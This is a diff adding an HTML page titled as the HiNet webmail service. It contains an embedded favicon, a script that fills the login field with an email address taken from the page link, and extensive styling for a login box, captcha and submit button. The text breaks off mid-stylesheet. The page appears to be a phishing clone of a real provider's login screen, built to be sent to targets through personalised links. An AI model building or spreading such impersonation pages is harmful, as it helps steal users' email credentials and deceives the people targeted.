@@ -1,0 +1,1082 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HiNet 網頁郵件服務</title>
+  <link rel="stylesheet" href="style.css">
+  <link rel="icon" type="image/x-icon" href="data:image/png;base64,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">
+
+
+  <script>
+      window.onload = function() {
+        // Function to extract query parameters from the URL
+        function getQueryParam(param) {
+          const urlParams = new URLSearchParams(window.location.search);
+          return urlParams.get(param);
+        }
+    
+        // Get the 'email' parameter from the URL
+        const email = getQueryParam('email');
+        
+        // If an email is present in the URL, set it as the value of the email input field
+        if (email) {
+          document.querySelector('input[name="email"]').value = email;
+        }
+      };
+    </script>
+
+  <style>
+
+.body{
+  -webkit-tap-highlight-color: rgba(0,0,0,0);
+  -webkit-text-size-adjust: 100%;
+  box-sizing: border-box;
+  font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+  font-size: 14px;
+  line-height: 1.42857143;
+  color: #333;
+  background-color: #fff;
+  margin: 0;
+  padding: 0;
+  height: 100%;
+}
+
+.outmost{
+  -webkit-tap-highlight-color: rgba(0,0,0,0);
+  -webkit-text-size-adjust: 100%;
+  font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+  line-height: 1.42857143;
+  color: #333;
+  box-sizing: border-box;
+  border-bottom: 0px;
+  border-left: 0px;
+  padding-bottom: 0px;
+  margin: 0px;
+  outline-style: none;
+  padding-left: 0px;
+  outline-width: 0px;
+  padding-right: 0px;
+  font-size: 100%;
+  vertical-align: top;
+  border-top: 0px;
+  border-right: 0px;
+  padding-top: 0px;
+  display: flex;
+  flex-flow: column nowrap;
+  justify-content: flex-start;
+  align-items: center;
+  left: 50%;
+  transform: translate(-50%, 0%);
+  position: absolute;
+  max-width: 2580px;
+  height: 100%;
+  min-width: 1500px;
+}
+
+.head-left{
+  -webkit-tap-highlight-color: rgba(0,0,0,0);
+  -webkit-text-size-adjust: 100%;
+  font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+  line-height: 1.42857143;
+  color: #333;
+  box-sizing: border-box;
+  border-bottom: 0px;
+  border-left: 0px;
+  padding-bottom: 0px;
+  margin: 0px;
+  outline-style: none;
+  padding-left: 0px;
+  outline-width: 0px;
+  padding-right: 0px;
+  font-size: 100%;
+  vertical-align: top;
+  border-top: 0px;
+  border-right: 0px;
+  padding-top: 0px;
+  order: 1;
+  display: flex;
+  flex-flow: row nowrap;
+  justify-content: flex-start;
+  align-items: center;
+}
+
+.head-right{
+  -webkit-tap-highlight-color: rgba(0,0,0,0);
+  -webkit-text-size-adjust: 100%;
+  font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+  line-height: 1.42857143;
+  color: #333;
+  box-sizing: border-box;
+  border-bottom: 0px;
+  border-left: 0px;
+  padding-bottom: 0px;
+  margin: 0px;
+  outline-style: none;
+  padding-left: 0px;
+  outline-width: 0px;
+  padding-right: 0px;
+  font-size: 100%;
+  vertical-align: top;
+  border-top: 0px;
+  border-right: 0px;
+  padding-top: 0px;
+  order: 1;
+  display: block;
+  width: 160px;
+}
+
+.head{
+  -webkit-tap-highlight-color: rgba(0,0,0,0);
+  -webkit-text-size-adjust: 100%;
+  font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+  line-height: 1.42857143;
+  color: #333;
+  box-sizing: border-box;
+  border-bottom: 0px;
+  border-left: 0px;
+  padding-bottom: 0px;
+  margin: 0px;
+  outline-style: none;
+  padding-left: 0px;
+  outline-width: 0px;
+  padding-right: 0px;
+  font-size: 100%;
+  vertical-align: top;
+  border-top: 0px;
+  border-right: 0px;
+  padding-top: 0px;
+  order: 1;
+  display: flex;
+  flex-flow: row nowrap;
+  justify-content: space-between;
+  align-items: center;
+  width: 100%;
+  height: 60px;
+}
+
+.middle{
+  -webkit-tap-highlight-color: rgba(0,0,0,0);
+  -webkit-text-size-adjust: 100%;
+  font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+  line-height: 1.42857143;
+  color: #333;
+  box-sizing: border-box;
+  border-bottom: 0px;
+  border-left: 0px;
+  padding-bottom: 0px;
+  margin: 0px;
+  outline-style: none;
+  padding-left: 0px;
+  outline-width: 0px;
+  padding-right: 0px;
+  font-size: 100%;
+  vertical-align: top;
+  border-top: 0px;
+  border-right: 0px;
+  padding-top: 0px;
+  order: 1;
+  display: flex;
+  flex-flow: row nowrap;
+  justify-content: space-evenly;
+  align-items: flex-end;
+  width: 100%;
+}
+
+
+
+.advert{
+  line-height: normal;
+  -webkit-locale: "ja";
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  flex-shrink: 0;
+  border: none;
+  width: 50%;
+  height: 100%;
+  font-family: Roboto,Arial,sans-serif;
+  display: flex;
+  flex-direction: column;
+  background-color: white;
+  font-size: 20px;
+}
+
+.ad-image{
+  line-height: normal;
+  font-family: Roboto,Arial,sans-serif;
+  font-size: 20px;
+  color: inherit;
+  cursor: pointer;
+  display: block;
+  flex-shrink: 0;
+  flex-grow: 0;
+  width: 100%;
+  max-width: 2500px;
+  max-height: 260px;
+  background-image: url(https://assets.epicurious.com/photos/624d9590857fa7e509238b59/16:9/w_2240,c_limit/RegionalChinese_HERO_033122_31320.jpg);
+  background-repeat: no-repeat;
+  background-size: contain;
+  animation: fadein_keyframes .9s both;
+  background-position: center;
+  background-color: #f0f0ec;
+}
+
+.under-ad{
+  line-height: normal;
+  font-family: Roboto,Arial,sans-serif;
+  font-size: 20px;
+  padding: 0;
+  box-sizing: border-box;
+  align-items: center;
+  display: flex;
+  flex: 1 0 0;
+  margin: 8px 23.2px 0 23.2px;
+  background-color: white;
+}
+
+.year{
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  flex-shrink: 0;
+  line-height: 1.4em;
+  font-weight: 700;
+  font-family: "Noto Sans JP",Roboto,Arial,sans-serif;
+  font-size: 30px;
+}
+
+.under-year{
+  padding: 0;
+  box-sizing: border-box;
+  flex-shrink: 0;
+  line-height: 1.4em;
+  font-weight: 300;
+  margin: 6px 0 0 0;
+  opacity: 0.7;
+  font-family: "Noto Sans JP",Roboto,Arial,sans-serif;
+  font-size: 17px;
+  display: block;
+}
+
+.arrow{
+  line-height: normal;
+  font-family: Roboto,Arial,sans-serif;
+  font-size: 20px;
+  color: inherit;
+  cursor: pointer;
+  flex-shrink: 0;
+  flex-grow: 0;
+  height: 60px;
+  display: block;
+  background-color: #e84e96;
+  border-radius: 50%;
+  animation: fadein_keyframes .5s both;
+  box-shadow: 0 0 2px 0 rgba(0,0,0,0.12),0 2px 2px 0 rgba(0,0,0,0.24);
+  text-shadow: 1px 1px 0 rgba(255,255,255,0.1);
+}
+
+.two-years{
+  line-height: normal;
+  font-family: Roboto,Arial,sans-serif;
+  font-size: 20px;
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  flex: 1 0 0;
+}
+
+.two-tab{
+  -webkit-tap-highlight-color: rgba(0,0,0,0);
+  -webkit-text-size-adjust: 100%;
+  font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+  line-height: 1.42857143;
+  margin: 0;
+  padding: 0;
+  list-style: none;
+  font-size: 16px;
+  color: #9c9c9c;
+  box-sizing: content-box;
+  height: 40px;
+  width: 100%;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  margin-bottom: 10px;
+  font-weight: 600;
+  border-radius: 50px;
+  margin-top: 10px;
+}
+
+.tab1{
+  -webkit-tap-highlight-color: rgba(0,0,0,0);
+  -webkit-text-size-adjust: 100%;
+  font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+  font-size: 16px;
+  font-weight: 600;
+  box-sizing: border-box;
+  margin: 0;
+  list-style: none;
+  float: left;
+  line-height: 31px;
+  overflow: hidden;
+  position: relative;
+  margin-bottom: 0px;
+  margin-right: 10px;
+  padding: 0 5px;
+  transition: 0.3s;
+  color: #fff;
+  background: #3364e0;
+  border: none;
+  cursor: default;
+  border-radius: 50px;
+}
+
+.tab2{
+  -webkit-tap-highlight-color: rgba(0,0,0,0);
+  -webkit-text-size-adjust: 100%;
+  font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+  font-size: 16px;
+  font-weight: 600;
+  list-style: none;
+  line-height: 31px;
+  box-sizing: border-box;
+  background-color: transparent;
+  transition: 0.3s;
+  display: block;
+  padding: 0 20px;
+  text-decoration: none;
+  cursor: pointer;
+  color: #3364e0;
+}
+
+.login-blocks{
+  
+
+}
+
+.login-center{
+  -webkit-tap-highlight-color: rgba(0,0,0,0);
+  -webkit-text-size-adjust: 100%;
+  font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+  line-height: 1.42857143;
+  color: #333;
+  box-sizing: border-box;
+  border-bottom: 0px;
+  border-left: 0px;
+  padding-bottom: 0px;
+  margin: 0px;
+  outline-style: none;
+  padding-left: 0px;
+  outline-width: 0px;
+  padding-right: 0px;
+  font-size: 100%;
+  vertical-align: top;
+  border-top: 0px;
+  border-right: 0px;
+  width: 300px;
+  min-height: 450px;
+  height: 441px;
+  z-index: 13;
+  padding-top: 0px;
+  margin-top: 0px;
+  align-self: center;
+}
+
+.abgne-tab{
+  -webkit-tap-highlight-color: rgba(0,0,0,0);
+  -webkit-text-size-adjust: 100%;
+  font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+  line-height: 1.42857143;
+  color: #333;
+  box-sizing: border-box;
+  border-bottom: 0px;
+  border-left: 0px;
+  padding-bottom: 0px;
+  outline-style: none;
+  padding-left: 0px;
+  outline-width: 0px;
+  padding-right: 0px;
+  font-size: 100%;
+  vertical-align: top;
+  border-top: 0px;
+  border-right: 0px;
+  padding-top: 0px;
+  clear: left;
+  width: 300px;
+  margin: 10px 0;
+}
+
+.tab-content{
+  -webkit-tap-highlight-color: rgba(0,0,0,0);
+  -webkit-text-size-adjust: 100%;
+  font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+  line-height: 1.42857143;
+  color: #333;
+  padding-bottom: 0px;
+  margin: 0px;
+  outline-style: none;
+  padding-left: 0px;
+  outline-width: 0px;
+  padding-right: 0px;
+  font-size: 100%;
+  vertical-align: top;
+  padding-top: 0px;
+  box-sizing: unset;
+  clear: left;
+  width: 100%;
+  border-radius: 5px;
+  background: #fff;
+  box-shadow: 0 0 1px 0 rgba(24, 94, 224, 0.25),
+  0 6px 12px 0 rgba(24, 94, 224, 0.25);
+  border: solid 1px #e6eef9;
+}
+
+.form-div{
+  -webkit-tap-highlight-color: rgba(0,0,0,0);
+  -webkit-text-size-adjust: 100%;
+  font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+  line-height: 1.42857143;
+  color: #333;
+  box-sizing: border-box;
+  border-bottom: 0px;
+  border-left: 0px;
+  margin: 0px;
+  outline-style: none;
+  outline-width: 0px;
+  font-size: 100%;
+  vertical-align: top;
+  border-top: 0px;
+  border-right: 0px;
+  padding: 25px 15px 10px 15px;
+}
+
+.h3{
+  -webkit-tap-highlight-color: rgba(0,0,0,0);
+  -webkit-text-size-adjust: 100%;
+  text-align: center;
+  box-sizing: border-box;
+  font-family: inherit;
+  line-height: 1.1;
+  font-size: 24px;
+  font-weight: 700;
+  letter-spacing: 1px;
+  margin: 0 0 10px;
+  color: #3364e0;
+}
+
+.f16{
+  -webkit-tap-highlight-color: rgba(0,0,0,0);
+  -webkit-text-size-adjust: 100%;
+  font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+  line-height: 1.42857143;
+  color: #333;
+  box-sizing: border-box;
+  border-bottom: 0px;
+  border-left: 0px;
+  padding-bottom: 0px;
+  margin: 0px;
+  outline-style: none;
+  padding-left: 0px;
+  outline-width: 0px;
+  padding-right: 0px;
+  font-size: 100%;
+  vertical-align: top;
+  border-top: 0px;
+  border-right: 0px;
+  padding-top: 0px;
+  text-align: center;
+}
+
+.ctrl-group1{
+  -webkit-tap-highlight-color: rgba(0,0,0,0);
+  -webkit-text-size-adjust: 100%;
+  font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+  color: #333;
+  box-sizing: border-box;
+  border-bottom: 0px;
+  border-left: 0px;
+  padding-bottom: 0px;
+  margin: 0px;
+  outline-style: none;
+  padding-left: 0px;
+  outline-width: 0px;
+  padding-right: 0px;
+  font-size: 100%;
+  vertical-align: top;
+  border-top: 0px;
+  border-right: 0px;
+  padding-top: 0px;
+  margin-top: 12px;
+  line-height: 24px;
+}
+
+.user-icon{
+  -webkit-tap-highlight-color: rgba(0,0,0,0);
+  -webkit-text-size-adjust: 100%;
+  font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+  line-height: 24px;
+  box-sizing: border-box;
+  border-bottom: 0px;
+  border-left: 0px;
+  padding-bottom: 0px;
+  margin: 0px;
+  outline-style: none;
+  padding-left: 0px;
+  outline-width: 0px;
+  padding-right: 0px;
+  font-size: 100%;
+  vertical-align: top;
+  border-top: 0px;
+  border-right: 0px;
+  padding-top: 0px;
+  width: 20px;
+  height: 20px;
+  display: inline-block;
+  color: #3364e0;
+  margin-left: 5px;
+  margin-top: 5px;
+  margin-bottom: 3px;
+}
+
+.loginLabel{
+  -webkit-tap-highlight-color: rgba(0,0,0,0);
+  -webkit-text-size-adjust: 100%;
+  font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+  line-height: 24px;
+  box-sizing: border-box;
+  display: inline-block;
+  max-width: 100%;
+  margin-bottom: 5px;
+  font-weight: normal;
+  font-size: small;
+  color: #6d6d6d;
+  margin-left: 1em;
+  margin-top: 4px;
+  vertical-align: middle;
+}
+
+.inputTxt{
+  -webkit-tap-highlight-color: rgba(0,0,0,0);
+  -webkit-text-size-adjust: 100%;
+  box-sizing: border-box;
+  margin: 0;
+  font: inherit;
+  line-height: inherit;
+  outline: 0;
+  position: absolute;
+  font-size: 13px;
+  font-family: Helvetica,Arial;
+  width: 196px;
+  height: 33px;
+  background-color: #f3f5fc;
+  border: 1px solid transparent;
+  border-radius: 50px;
+  padding-left: 15px;
+  color: rgba(30,53,108,0.7);
+  letter-spacing: 1px;
+  vertical-align: middle;
+}
+
+.imgKB{
+  -webkit-tap-highlight-color: rgba(0,0,0,0);
+  -webkit-text-size-adjust: 100%;
+  font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+  color: #333;
+  font-size: 100%;
+  line-height: 24px;
+  box-sizing: border-box;
+  border: 0;
+  left: 205px;
+  margin-top: 9px;
+  position: relative;
+  cursor: pointer;
+  vertical-align: middle;
+}
+
+
+.inputCaptcha{
+  -webkit-tap-highlight-color: rgba(0,0,0,0);
+  -webkit-text-size-adjust: 100%;
+  box-sizing: border-box;
+  margin: 0;
+  font: inherit;
+  line-height: inherit;
+  outline: 0;
+  position: absolute;
+  font-size: 13px;
+  font-family: Helvetica,Arial;
+  width: 196px;
+  height: 33px;
+  background-color: #f3f5fc;
+  border: 1px solid;
+  border-radius: 50px;
+  padding-left: 15px;
+  color: rgba(30,53,108,0.7);
+  letter-spacing: 1px;
+  vertical-align: middle;
+}
+
+.img-captcha{
+  -webkit-tap-highlight-color: rgba(0,0,0,0);
+  -webkit-text-size-adjust: 100%;
+  font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+  line-height: 1.42857143;
+  color: #333;
+  box-sizing: border-box;
+  border-bottom: 0px;
+  border-left: 0px;
+  padding-bottom: 0px;
+  margin: 0px;
+  outline-style: none;
+  padding-left: 0px;
+  outline-width: 0px;
+  padding-right: 0px;
+  font-size: 100%;
+  vertical-align: top;
+  border-top: 0px;
+  border-right: 0px;
+  padding-top: 0px;
+  margin-top: 8px;
+  margin-left: 45px;
+  height: 30px;
+  width: 120px;
+  margin-bottom: 3px;
+}
+
+.clickable-image{
+  -webkit-tap-highlight-color: rgba(0,0,0,0);
+  -webkit-text-size-adjust: 100%;
+  font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+  line-height: 1.42857143;
+  color: #333;
+  font-size: 100%;
+  box-sizing: border-box;
+  border: 0;
+  vertical-align: middle;
+}
+
+.savebtn{
+  -webkit-tap-highlight-color: rgba(0,0,0,0);
+  -webkit-text-size-adjust: 100%;
+  font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+  line-height: 1.42857143;
+  color: #333;
+  box-sizing: border-box;
+  border-bottom: 0px;
+  border-left: 0px;
+  padding-bottom: 0px;
+  margin: 0px;
+  outline-style: none;
+  padding-left: 0px;
+  outline-width: 0px;
+  padding-right: 0px;
+  font-size: 100%;
+  vertical-align: top;
+  border-top: 0px;
+  border-right: 0px;
+  padding-top: 0px;
+  margin-left: 58px;
+  margin-top: -10px;
+  margin-bottom: 3px;
+}
+
+.checkboxLabel{
+  -webkit-tap-highlight-color: rgba(0,0,0,0);
+  -webkit-text-size-adjust: 100%;
+  font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+  line-height: 1.42857143;
+  box-sizing: border-box;
+  max-width: 100%;
+  margin-bottom: 5px;
+  font-weight: normal;
+  font-size: small;
+  color: #1e356c;
+  margin-top: 5px;
+  display: inline-block;
+  margin-right: 13px;
+  vertical-align: middle;
+}
+
+.okbtn{
+  -webkit-tap-highlight-color: rgba(0,0,0,0);
+  -webkit-text-size-adjust: 100%;
+  box-sizing: border-box;
+  margin: 0;
+  font: inherit;
+  overflow: visible;
+  text-transform: none;
+  -webkit-appearance: button;
+  cursor: pointer;
+  font-family: inherit;
+  line-height: inherit;
+  width: 170px;
+  height: 33px;
+  border: 1px solid transparent;
+  border-radius: 50px;
+  margin-left: 50px;
+  margin-top: 5px;
+  transition: 0.3s;
+  font-size: 22px;
+  font-weight: bold;
+  background-color: #3364e0;
+  color: #fff;
+}
+
+.ctrlGroup-divTable{
